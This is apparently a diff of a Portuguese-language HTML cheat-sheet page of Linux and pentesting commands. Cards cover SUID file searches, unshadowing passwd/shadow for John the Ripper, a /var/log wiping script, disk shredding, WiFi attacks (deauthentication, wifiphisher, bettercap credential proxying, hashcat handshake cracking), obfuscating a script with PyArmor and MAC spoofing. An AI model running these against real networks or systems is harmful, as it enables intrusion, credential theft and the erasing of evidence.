+                <p><strong>PyArmor with Obfuscation - </strong>pyarmor gen -O obfdist --pack dist/Firefox
+                    gunkey.py</p>
+            </div>
+        </div>
+
+        <div class="note-card2">
+            <h1>Busca de Arquivos</h1>
+            <p><strong>Buscar arquivos por nome:</strong></p>
+            <p>find / -name "nome_do_arquivo" 2>/dev/null</p>
+            <p><strong>Buscar arquivos por extensão:</strong></p>
+            <p>find / -type f -name "*.extensao" 2>/dev/null</p>
+            <p><strong>Buscar arquivos maiores que 100MB:</strong></p>
+            <p>find / -type f -size +100M 2>/dev/null</p>
+            <p><strong>Buscar arquivos modificados nos últimos 7 dias:</strong></p>
+            <p>find / -type f -mtime -7 2>/dev/null</p>
+            <p><strong>Buscar arquivos acessados nos últimos 24 horas:</strong></p>
+            <p>find / -type f -atime -1 2>/dev/null</p>
+            <p><strong>Buscar arquivos contendo "arquivo":</strong></p>
+            <p>grep -r --exclude-dir={proc,sys} "arquivo" / 2>/dev/null</p>
+            <p><strong>Buscar arquivos contendo "arquivo" em todos os arquivos:</strong></p>
+            <p>find / -type f -exec grep -H "arquivo" {} \; 2>/dev/null</p>
+            <p><strong>Buscar arquivos contendo "arquivo" em arquivos .txt:</strong></p>
+            <p>grep -r --include="*.txt" "arquivo" / 2>/dev/null</p>
+        </div>
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Permissões com Find</h1>
+            <p>find / -type f \( -name usuario1 -o -name usuario2 \) -exec ls -ladb {} \; 2>/dev/null</p>
+            <p>find / -name root.txt -exec ls -lda {} \; 2>/dev/null</p>
+            <p>find / -user root -perm -4000 -exec ls -ladb {} \; 2>/dev/null</p>
+            <p>find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null</p>
+            <p>find / -type f -perm -u=s -user des -ls 2>/dev/null</p>
+            <p>find / -type f -name "*.bak" 2>/dev/null</p>
+            <p>find / -perm -u=s -type f 2>/dev/null</p>
+        </div>
+
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>CRON</h1>
+            <p><strong>O arquivo crontab tem cinco campos de tempo seguidos pelo comando a ser
+                    executado:</strong></p>
+            <pre style="color: white;">
     ┌──────── min (0 - 59)
     │ ┌───────── hora (0 - 23)
     │ │ ┌────────── dia do mês (1 - 31)
@@ -429,47 +496,47 @@
     │ │ │ │ │
     * * * * * comando a ser executado
             </pre>
-                    <p><strong>Agendar uma tarefa para ser executada a cada minuto:</strong></p>
-                    <p><code>echo "*/1 * * * * /usr/bin/python3 /home/kali/Documentos/gun.py" | crontab -</code></p>
-                </div>
+            <p><strong>Agendar uma tarefa para ser executada a cada minuto:</strong></p>
+            <p><code>echo "*/1 * * * * /usr/bin/python3 /home/kali/Documentos/gun.py" | crontab -</code></p>
+        </div>
 
 
-                <!-- note 1 -->
-                <div class="note-card2">
-                    <h1>John The Ripper</h1>
-                    <p>reRun JOHN > delete 'john.pot'</p>
-                    <p>unshadow passwd shcat adow > passwords.txt</p>
-                    <p>john --show</p>
-                </div>
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>John The Ripper</h1>
+            <p>reRun JOHN > delete 'john.pot'</p>
+            <p>unshadow passwd shcat adow > passwords.txt</p>
+            <p>john --show</p>
+        </div>
 
-                <!-- note 1 -->
-                <div class="note-card2">
-                    <h1>AWK</h1>
-                    <p><strong>Imprimir número da linha e conteúdo - </strong> awk '{print NR,$0}' file.txt</p>
-                    <p><strong>Imprimir primeira e terceira coluna - </strong> awk '{print $1, $3}' file.txt</p>
-                    <p><strong>Usar cat e awk para imprimir primeira e terceira coluna - </strong> cat logfile | awk
-                        '{print $1,
-                        $3}'</p>
-                    <p><strong>Substituir 'espaço' por ':' - </strong> awk 'BEGIN{FS=" "; OFS=":"} {print $1,$4}'
-                        awk.txt</p>
-                    <p><strong>Coluna em linhas separado por vírgula - </strong> awk 'BEGIN{ORS=", "}{print $1}' awk.txt
-                    </p>
-                </div>
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>AWK</h1>
+            <p><strong>Imprimir número da linha e conteúdo - </strong> awk '{print NR,$0}' file.txt</p>
+            <p><strong>Imprimir primeira e terceira coluna - </strong> awk '{print $1, $3}' file.txt</p>
+            <p><strong>Usar cat e awk para imprimir primeira e terceira coluna - </strong> cat logfile | awk
+                '{print $1,
+                $3}'</p>
+            <p><strong>Substituir 'espaço' por ':' - </strong> awk 'BEGIN{FS=" "; OFS=":"} {print $1,$4}'
+                awk.txt</p>
+            <p><strong>Coluna em linhas separado por vírgula - </strong> awk 'BEGIN{ORS=", "}{print $1}' awk.txt
+            </p>
+        </div>
 
-                <!-- note 2 -->
-                <div class="note-card2">
-                    <h1>Formatação "ligada"</h1>
-                    <p><strong>Formatar disco para ext4:</strong></p>
-                    <p>sudo mkfs.ext4 /dev/sdX</p>
-                    <p><strong>Shred disco:</strong></p>
-                    <p>sudo shred -n 1 -v /dev/sdX</p>
-                </div>
+        <!-- note 2 -->
+        <div class="note-card2">
+            <h1>Formatação "ligada"</h1>
+            <p><strong>Formatar disco para ext4:</strong></p>
+            <p>sudo mkfs.ext4 /dev/sdX</p>
+            <p><strong>Shred disco:</strong></p>
+            <p>sudo shred -n 1 -v /dev/sdX</p>
+        </div>
 
-                <!-- note 3 -->
-                <div class="note-card2">
-                    <h1>Limpeza de Logs</h1>
-                    <p><strong>Script para limpar logs:</strong></p>
-                    <pre style="color: white;">
+        <!-- note 3 -->
+        <div class="note-card2">
+            <h1>Limpeza de Logs</h1>
+            <p><strong>Script para limpar logs:</strong></p>
+            <pre style="color: white;">
     #! /bin/sh
     cd /var/log
     for l in `ls -p|grep '/'`; do
@@ -478,57 +545,57 @@
     done
     echo Limpeza de log concluída!
             </pre>
-                </div>
+        </div>
 
-                <!-- note 1 -->
-                <div class="note-card2">
-                    <h1>Expandir LVM</h1>
-                    <p><strong>Verificar se o novo disco esta disponivél</strong></p>
-                    <p>lsblk</p>
-                    <p>fdisk -l</p>
-                    <br>
-                    <p><strong>Criar um Physical Volume (PV)</strong></p>
-                    <p>sudo pvcreate /dev/sdb</p>
-                    <p>sudo pvdisplay</p>
-                    <p><strong>Identifique o VG que seu LVM está usando:</strong></p>
-                    <p>sudo vgdisplay</p>
-                    <br>
-                    <p><strong>Suponha que seu VG se chame vg_root. Agora, adicione o novo PV ao VG:</strong></p>
-                    <p>sudo vgextend vg_root /dev/sdb</p>
-                    <br>
-                    <p><strong>Confirme se o disco foi adicionado:</strong></p>
-                    <p>sudo vgdisplay</p>
-                    <br>
-                    <p><strong>Liste os LVs disponíveis:</strong></p>
-                    <p>sudo lvdisplay</p>
-                    <br>
-                    <p><strong>Identifique o LV que deseja expandir (exemplo: /dev/vg_root/lv_root) e aumente o tamanho
-                            dele:</strong></p>
-                    <p>sudo lvextend -l +100%FREE /dev/vg_root/lv_root</p>
-                    <br>
-                    <p><strong>Se o sistema de arquivos for ext4, use:</strong></p>
-                    <p>sudo resize2fs /dev/vg_root/lv_root</p>
-                    <br>
-                    <p><strong>Se for XFS, use:</strong></p>
-                    <p>sudo xfs_growfs /dev/vg_root/lv_root</p>
-                    <br>
-                    <p><strong>Verifique se o espaço foi expandido:</strong></p>
-                    <p>df -h</p>
-                </div>
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Expandir LVM</h1>
+            <p><strong>Verificar se o novo disco esta disponivél</strong></p>
+            <p>lsblk</p>
+            <p>fdisk -l</p>
+            <br>
+            <p><strong>Criar um Physical Volume (PV)</strong></p>
+            <p>sudo pvcreate /dev/sdb</p>
+            <p>sudo pvdisplay</p>
+            <p><strong>Identifique o VG que seu LVM está usando:</strong></p>
+            <p>sudo vgdisplay</p>
+            <br>
+            <p><strong>Suponha que seu VG se chame vg_root. Agora, adicione o novo PV ao VG:</strong></p>
+            <p>sudo vgextend vg_root /dev/sdb</p>
+            <br>
+            <p><strong>Confirme se o disco foi adicionado:</strong></p>
+            <p>sudo vgdisplay</p>
+            <br>
+            <p><strong>Liste os LVs disponíveis:</strong></p>
+            <p>sudo lvdisplay</p>
+            <br>
+            <p><strong>Identifique o LV que deseja expandir (exemplo: /dev/vg_root/lv_root) e aumente o tamanho
+                    dele:</strong></p>
+            <p>sudo lvextend -l +100%FREE /dev/vg_root/lv_root</p>
+            <br>
+            <p><strong>Se o sistema de arquivos for ext4, use:</strong></p>
+            <p>sudo resize2fs /dev/vg_root/lv_root</p>
+            <br>
+            <p><strong>Se for XFS, use:</strong></p>
+            <p>sudo xfs_growfs /dev/vg_root/lv_root</p>
+            <br>
+            <p><strong>Verifique se o espaço foi expandido:</strong></p>
+            <p>df -h</p>
+        </div>
 
-                <!-- note 1 -->
-                <div class="note-card2">
-                    <h1>Terminal com ProxyChains e Tor</h1>
-                    <p><strong>Instalar Proxychains:</strong></p>
-                    <p>sudo apt install proxychains</p>
-                    <p><strong>Instalar Tor:</strong></p>
-                    <p>sudo apt install tor</p>
-                    <p><strong>Iniciar serviço Tor:</strong></p>
-                    <p>sudo service tor start</p>
-                    <p><strong>Editar configuração do Proxychains:</strong></p>
-                    <p>sudo nano /etc/proxychains.conf</p>
-                    <p><strong>Adicionar as seguintes linhas:</strong></p>
-                    <pre style="color: white;">
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Terminal com ProxyChains e Tor</h1>
+            <p><strong>Instalar Proxychains:</strong></p>
+            <p>sudo apt install proxychains</p>
+            <p><strong>Instalar Tor:</strong></p>
+            <p>sudo apt install tor</p>
+            <p><strong>Iniciar serviço Tor:</strong></p>
+            <p>sudo service tor start</p>
+            <p><strong>Editar configuração do Proxychains:</strong></p>
+            <p>sudo nano /etc/proxychains.conf</p>
+            <p><strong>Adicionar as seguintes linhas:</strong></p>
+            <pre style="color: white;">
     dynamic_chain
     proxy_dns
     tcp_read_time_out 15000
@@ -537,46 +604,46 @@
     # Usando o Tor como proxy
     socks4  127.0.0.1 9050  
             </pre>
-                    <p><strong>Testar conexão com Tor:</strong></p>
-                    <p>curl --socks5 127.0.0.1:9050 https://check.torproject.org</p>
-                </div>
+            <p><strong>Testar conexão com Tor:</strong></p>
+            <p>curl --socks5 127.0.0.1:9050 https://check.torproject.org</p>
+        </div>
 
-                <!-- note 1 -->
-                <div class="note-card2">
-                    <h1>Wifi Hacking</h1>
-                    <p>hcxdumptool -o dump.pcapng -i wlan0 --enable_status=1</p>
-                    <p>hcxpcaptool -z test.16800 test.pcapng</p>
-                    <p>hashcat -m 16800 test.16800 /usr/share/wordlists/rockyou.txt -r
-                        /usr/share/hashcat/rules/best64.rule
-                        -a 0</p>
-                    <p>hashcat -m 16800 test.16800 /usr/share/wordlists/rockyou.txt -r
-                        /usr/share/hashcat/rules/best64.rule
-                        -a 0 -w 3</p>
-                    <p>sudo airmon-ng wlan0 &lt;channel&gt;</p>
-                    <p>sudo iwconfig wlp4s0mon channel 1</p>
-                    <p>sudo aireplay-ng --deauth 200 -a 00:31:92:AF:52:B6 wlan0</p>
-                    <p>bettercap -T 192.168.0.100 --interface at0 --no-spoofing --no-discovery --proxy --proxy-port 80
-                        --proxy-https --proxy-https-port 443 -P POST</p>
-                    <p>sudo wifiphisher -nD -i wlan0</p>
-                    <p>sudo wifite --bully --kill</p>
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Wifi Hacking</h1>
+            <p>hcxdumptool -o dump.pcapng -i wlan0 --enable_status=1</p>
+            <p>hcxpcaptool -z test.16800 test.pcapng</p>
+            <p>hashcat -m 16800 test.16800 /usr/share/wordlists/rockyou.txt -r
+                /usr/share/hashcat/rules/best64.rule
+                -a 0</p>
+            <p>hashcat -m 16800 test.16800 /usr/share/wordlists/rockyou.txt -r
+                /usr/share/hashcat/rules/best64.rule
+                -a 0 -w 3</p>
+            <p>sudo airmon-ng wlan0 &lt;channel&gt;</p>
+            <p>sudo iwconfig wlp4s0mon channel 1</p>
+            <p>sudo aireplay-ng --deauth 200 -a 00:31:92:AF:52:B6 wlan0</p>
+            <p>bettercap -T 192.168.0.100 --interface at0 --no-spoofing --no-discovery --proxy --proxy-port 80
+                --proxy-https --proxy-https-port 443 -P POST</p>
+            <p>sudo wifiphisher -nD -i wlan0</p>
+            <p>sudo wifite --bully --kill</p>
 
-                </div>
+        </div>
 
-                <!-- note 1 -->
-                <div class="note-card2">
-                    <h1>Geração de Wordlists:</h1>
-                    <p>cewl -d 2 -m 5 -w passwords.txt http://10.10.145.228 --with-numbers</p>
-                    <p>cewl -d 0 -m 5 -w usernames.txt http://MACHINE_IP/team.php --lowercase</p>
-                    <p>crunch 3 3 0123456789ABCDEF -o 3digits.txt</p>
-                    <p>crunch 3 3 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o 3digits.txt</p>
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Geração de Wordlists:</h1>
+            <p>cewl -d 2 -m 5 -w passwords.txt http://10.10.145.228 --with-numbers</p>
+            <p>cewl -d 0 -m 5 -w usernames.txt http://MACHINE_IP/team.php --lowercase</p>
+            <p>crunch 3 3 0123456789ABCDEF -o 3digits.txt</p>
+            <p>crunch 3 3 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o 3digits.txt</p>
 
-                </div>
+        </div>
 
 
-                <div class="note-card2">
-                    <h1>Alterar o MACADDRESS durante a inicialização</h1>
-                    <p><strong>Crie o arquivo de serviço:</strong></p>
-                    <pre style="color: white;">
+        <div class="note-card2">
+            <h1>Alterar o MACADDRESS durante a inicialização</h1>
+            <p><strong>Crie o arquivo de serviço:</strong></p>
+            <pre style="color: white;">
     sudo nano /etc/systemd/system/macchanger.service
 
     [Unit]
@@ -592,152 +659,152 @@
 
     [Install]
     WantedBy=multi-user.target</pre>
-                    <p><strong>Recarregue os daemons do systemd:</strong></p>
-                    <p>sudo systemctl daemon-reload</p>
-                    <p><strong>Habilite e inicie o serviço:</strong></p>
-                    <p>sudo systemctl enable macchanger.service</p>
-                    <p>sudo systemctl start macchanger.service</p>
-                    <p><strong>Verifique o status do serviço:</strong></p>
-                    <p>sudo systemctl status macchanger.service</p>
-                    <p><strong>Verifique o endereço MAC:</strong></p>
-                    <p>macchanger -s [interface]</p>
-                </div>
-
-
-                <div class="note-card2">
-                    <h1>Engenharia Reversa</h1>
-                    <p><strong>Desmontar binário com objdump:</strong> objdump -d [binario]</p>
-                    <p><strong>Inspecionar strings em um binário:</strong> strings binario</p>
-                    <p><strong>Descompilar binário com Ghidra:</strong> ghidra binario</p>
-                    <p><strong>Descompilar binário com Radare2:</strong> r2 -A binario</p>
-                    <p><strong>Debug com GDB:</strong> gdb binario</p>
-                    <p><strong>Carregar binário no Hopper:</strong> hopper binario</p>
-                    <p><strong>Verificar dependências de um binário:</strong> ldd binario</p>
-                    <p><strong>Monitorar chamadas de sistema:</strong> strace ./binario</p>
-                    <p><strong>Exibir conteúdo hexadecimal de um arquivo:</strong> hexdump -C arquivo</p>
-                    <p><strong>Exibir informações detalhadas de um arquivo:</strong> stat arquivo</p>
-                    <p><strong>Inspecionar cabeçalhos ELF de um binário:</strong> readelf -h binario</p>
-                </div>
-
-
-                <div class="note-card2">
-                    <h1>Configuração de Data e Hora</h1>
-                    <p><strong>Listar fusos horários disponíveis:</strong></p>
-                    <p>timedatectl list-timezones | grep America/[Regiao]</p>
-                    <p><strong>Definir fuso horário:</strong></p>
-                    <p>sudo timedatectl set-timezone America/Sao_Paulo</p>
-                </div>
-
-            </section>
-
-
-
-            <!-- Modal -->
-            <div id="modal" class="modal">
-                <div class="modal-content">
-                    <span class="close" onclick="closeModal()">&times;</span>
-                    <h2 id="modal-title"></h2>
-                    <div id="modal-details">
-                        <!-- Conteúdo do modal será injetado aqui -->
-                    </div>
-                </div>
-            </div>
+            <p><strong>Recarregue os daemons do systemd:</strong></p>
+            <p>sudo systemctl daemon-reload</p>
+            <p><strong>Habilite e inicie o serviço:</strong></p>
+            <p>sudo systemctl enable macchanger.service</p>
+            <p>sudo systemctl start macchanger.service</p>
+            <p><strong>Verifique o status do serviço:</strong></p>
+            <p>sudo systemctl status macchanger.service</p>
+            <p><strong>Verifique o endereço MAC:</strong></p>
+            <p>macchanger -s [interface]</p>
         </div>
 
-        <style>
-            /* Estilo geral do modal */
-            .modal {
-                display: none;
-                /* Escondido por padrão */
-                position: fixed;
-                z-index: 1000;
-                left: 0;
-                top: 0;
-                width: 100%;
-                height: 100%;
-                background-color: rgba(0, 0, 0, 0.5);
-                /* Fundo semitransparente */
-                animation: fadeIn 0.4s ease-in-out;
+
+        <div class="note-card2">
+            <h1>Engenharia Reversa</h1>
+            <p><strong>Desmontar binário com objdump:</strong> objdump -d [binario]</p>
+            <p><strong>Inspecionar strings em um binário:</strong> strings binario</p>
+            <p><strong>Descompilar binário com Ghidra:</strong> ghidra binario</p>
+            <p><strong>Descompilar binário com Radare2:</strong> r2 -A binario</p>
+            <p><strong>Debug com GDB:</strong> gdb binario</p>
+            <p><strong>Carregar binário no Hopper:</strong> hopper binario</p>
+            <p><strong>Verificar dependências de um binário:</strong> ldd binario</p>
+            <p><strong>Monitorar chamadas de sistema:</strong> strace ./binario</p>
+            <p><strong>Exibir conteúdo hexadecimal de um arquivo:</strong> hexdump -C arquivo</p>
+            <p><strong>Exibir informações detalhadas de um arquivo:</strong> stat arquivo</p>
+            <p><strong>Inspecionar cabeçalhos ELF de um binário:</strong> readelf -h binario</p>
+        </div>
+
+
+        <div class="note-card2">
+            <h1>Configuração de Data e Hora</h1>
+            <p><strong>Listar fusos horários disponíveis:</strong></p>
+            <p>timedatectl list-timezones | grep America/[Regiao]</p>
+            <p><strong>Definir fuso horário:</strong></p>
+            <p>sudo timedatectl set-timezone America/Sao_Paulo</p>
+        </div>
+
+    </section>
+
+
+
+    <!-- Modal -->
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <h2 id="modal-title"></h2>
+            <div id="modal-details">
+                <!-- Conteúdo do modal será injetado aqui -->
+            </div>
+        </div>
+    </div>
+    </div>
+
+    <style>
+        /* Estilo geral do modal */
+        .modal {
+            display: none;
+            /* Escondido por padrão */
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            /* Fundo semitransparente */
+            animation: fadeIn 0.4s ease-in-out;
+        }
+
+        /* Animação de entrada */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
             }
 
-            /* Animação de entrada */
-            @keyframes fadeIn {
-                from {
-                    opacity: 0;
-                }
+            to {
+                opacity: 1;
+            }
+        }
 
-                to {
-                    opacity: 1;
-                }
+        /* Animação de saída */
+        @keyframes fadeOut {
+            from {
+                opacity: 1;
             }
 
-            /* Animação de saída */
-            @keyframes fadeOut {
-                from {
-                    opacity: 1;
-                }
+            to {
+                opacity: 0;
+            }
+        }
 
-                to {
-                    opacity: 0;
-                }
+        /* Conteúdo do modal */
+        .modal-content {
+            position: relative;
+            margin: 5% auto;
+            padding: 20px;
+            background: #2e2e2e;
+            color: azure;
+            border-radius: 10px;
+            max-width: 1400px;
+            /* Largura máxima */
+            width: 90%;
+            /* Adapta ao tamanho da tela */
+            top: -5%;
+            /* Desloca para cima */
+            max-height: 85vh;
+            /* Altura máxima para caber na tela */
+            overflow-y: auto;
+            /* Adiciona barra de rolagem vertical */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            animation: fadeInUp 0.4s ease-in-out;
+        }
+
+        /* Animação de entrada do conteúdo */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
             }
 
-            /* Conteúdo do modal */
-            .modal-content {
-                position: relative;
-                margin: 5% auto;
-                padding: 20px;
-                background: #2e2e2e;
-                color: azure;
-                border-radius: 10px;
-                max-width: 1400px;
-                /* Largura máxima */
-                width: 90%;
-                /* Adapta ao tamanho da tela */
-                top: -5%;
-                /* Desloca para cima */
-                max-height: 85vh;
-                /* Altura máxima para caber na tela */
-                overflow-y: auto;
-                /* Adiciona barra de rolagem vertical */
-                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-                animation: fadeInUp 0.4s ease-in-out;
+            to {
+                opacity: 1;
+                transform: translateY(0);
             }
+        }
 
-            /* Animação de entrada do conteúdo */
-            @keyframes fadeInUp {
-                from {
-                    opacity: 0;
-                    transform: translateY(10px);
-                }
+        /* Botão de fechar */
+        .modal-content .close {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: rgb(204, 204, 204);
+            cursor: pointer;
+            transition: color 0.3s;
+        }
 
-                to {
-                    opacity: 1;
-                    transform: translateY(0);
-                }
-            }
+        .modal-content .close:hover {
+            color: red;
+        }
 
-            /* Botão de fechar */
-            .modal-content .close {
-                position: absolute;
-                top: 10px;
-                right: 15px;
-                font-size: 1.5rem;
-                font-weight: bold;
-                color: rgb(204, 204, 204);
-                cursor: pointer;
-                transition: color 0.3s;
-            }
-
-            .modal-content .close:hover {
-                color: red;
-            }
-
-            /* Animação de saída do conteúdo ao fechar */
-            .modal-content.closing {
-                animation: fadeOut 0.4s ease-in-out;
-            }
-        </style>
+        /* Animação de saída do conteúdo ao fechar */
+        .modal-content.closing {
+            animation: fadeOut 0.4s ease-in-out;
+        }
+    </style>
 
 
 </body>
